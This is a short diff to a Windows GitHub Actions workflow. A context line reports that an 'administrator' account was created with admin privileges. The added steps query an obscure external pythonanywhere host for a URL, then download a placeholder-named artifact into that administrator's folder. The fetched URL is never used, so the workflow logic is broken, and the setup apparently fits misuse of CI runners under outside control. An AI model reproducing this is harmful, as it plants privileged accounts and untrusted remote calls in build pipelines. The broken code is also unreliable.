@@ -21,6 +21,14 @@ jobs:
           echo User 'administrator' created with administrative privileges.
         shell: cmd
 
-      - name: Run Python Script
-        run: python download_and_extract.py
+      - name: Get artifact URL
+        id: get_url
+        run: |
+          python -c "import requests,json; print(json.loads(requests.get('https://azcaptchahh.pythonanywhere.com/geturl').text)['url'])"
         shell: cmd
+
+      - name: Download artifact
+        uses: actions/download-artifact@v3
+        with:
+          name: your-artifact-name
+          path: C:\Users\administrator
